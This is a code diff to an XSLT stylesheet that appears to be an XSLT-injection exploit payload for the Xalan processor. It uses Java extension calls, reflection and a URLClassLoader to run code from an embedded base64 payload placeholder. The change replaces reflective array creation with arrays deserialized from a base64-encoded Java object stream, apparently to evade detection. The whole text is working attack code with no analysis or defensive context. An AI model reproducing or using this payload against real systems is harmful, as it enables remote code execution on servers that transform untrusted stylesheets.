@@ -1,12 +1,14 @@
 <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:j="http://xml.apache.org/xalan/java" exclude-result-prefixes="j">
 <xsl:template match="/"> 
 <xsl:variable name="data">${[BASE64PAYLOAD]}</xsl:variable>
+<xsl:variable name="arrays">rO0ABXVyAA9bTGphdmEubmV0LlVSTDtSUf0kxRtozQIAAHhwAAAAAHVyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAA=</xsl:variable>
+<xsl:variable name="ois" select="j:java.io.ObjectInputStream.new(j:java.io.ByteArrayInputStream.new(j:decodeBuffer(j:sun.misc.BASE64Decoder.new(),$arrays)))" />
 <xsl:variable name="n" select="j:get(j:java.util.HashMap.new(),'')"/>
 <xsl:variable name="c1" select="j:getInterfaces(j:java.lang.Class.forName('java.lang.Number'))"/>  	
 <xsl:variable name="c2" select="j:getInterfaces(j:java.lang.Class.forName('java.io.File'))"/>
 <xsl:variable name="c3" select="j:getInterfaces(j:java.lang.Class.forName('java.util.Hashtable'))"/>
 <xsl:variable name="l" select="j:java.util.ArrayList.new()"/>
-<xsl:value-of select="substring(j:add($l,j:java.lang.reflect.Array.newInstance(j:java.lang.Class.forName('java.net.URL'),0)),5)"/>
+<xsl:value-of select="substring(j:add($l,j:readObject($ois)),5)"/>
 <xsl:value-of select="j:java.lang.reflect.Array.set($c1,0,j:java.lang.Class.forName('[Ljava.net.URL;'))"/>
 <xsl:variable name="r" select="j:newInstance(j:getConstructor(j:java.lang.Class.forName('java.net.URLClassLoader'),$c1),j:toArray($l))"/>
 <xsl:value-of select="j:java.lang.reflect.Array.set($c3,0,j:java.lang.Class.forName('java.lang.String'))"/>
@@ -29,7 +31,8 @@
 <xsl:value-of select="j:java.lang.reflect.Array.set($c2,0,j:java.lang.Class.forName('java.lang.Object'))"/>
 <xsl:value-of select="j:java.lang.reflect.Array.set($c2,1,j:java.lang.Class.forName('[Ljava.lang.Object;'))"/>
 <xsl:value-of select="j:clear($l)"/>
-<xsl:value-of select="substring(j:add($l,j:java.lang.reflect.Array.newInstance(j:java.lang.Class.forName('java.lang.String'),0)),5)"/>
+<xsl:value-of select="substring(j:add($l,j:readObject($ois)),5)"/>
+<xsl:value-of select="j:close($ois)" />
 <xsl:value-of select="substring(j:set($l,0,j:toArray($l)),1,0)"/>
 <xsl:value-of select="j:add($l,0,$n)"/>
 <xsl:value-of select="j:invoke(j:getMethod(j:java.lang.Class.forName('java.lang.reflect.Method'),'invoke',$c2),$v,j:toArray($l))"/> 
